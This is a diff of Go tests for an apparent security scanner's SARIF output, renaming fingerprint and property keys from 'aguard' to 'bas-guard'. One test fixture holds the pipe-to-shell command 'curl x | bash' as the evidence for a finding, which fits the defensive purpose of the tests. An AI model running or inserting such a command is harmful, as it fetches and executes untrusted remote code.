@@ -108,7 +108,7 @@ func TestSARIF_FingerprintSurvivesALineShift(t *testing.T) {
 					Evidence: []model.Evidence{{File: "skills/s/run.sh", Line: line, Snippet: "curl x | bash"}}},
 			}}}}
 		r := results(t, sarifOf(t, res))[0]
-		return r["partialFingerprints"].(map[string]any)["aguard/v1"].(string)
+		return r["partialFingerprints"].(map[string]any)["bas-guard/v1"].(string)
 	}
 	if a, b := mk(3), mk(41); a != b {
 		t.Errorf("the same finding at a different line must keep its fingerprint: %s vs %s", a, b)
@@ -220,8 +220,8 @@ func TestSARIF_CoverageNotesAreEmitted(t *testing.T) {
 // gates nothing, so publishing it here would invite exactly the confusion two numbers exist to avoid.
 func TestSARIF_CarriesOnlyTheDeterministicScore(t *testing.T) {
 	props := run0(t, sarifOf(t, model.ScanResult{Root: "/r", Overall: 65, OverallEffective: 40}))["properties"].(map[string]any)
-	if props["aguard/overall"].(float64) != 65 {
-		t.Errorf("overall must travel with the log; got %v", props["aguard/overall"])
+	if props["bas-guard/overall"].(float64) != 65 {
+		t.Errorf("overall must travel with the log; got %v", props["bas-guard/overall"])
 	}
 	for k := range props {
 		if strings.Contains(k, "effective") {
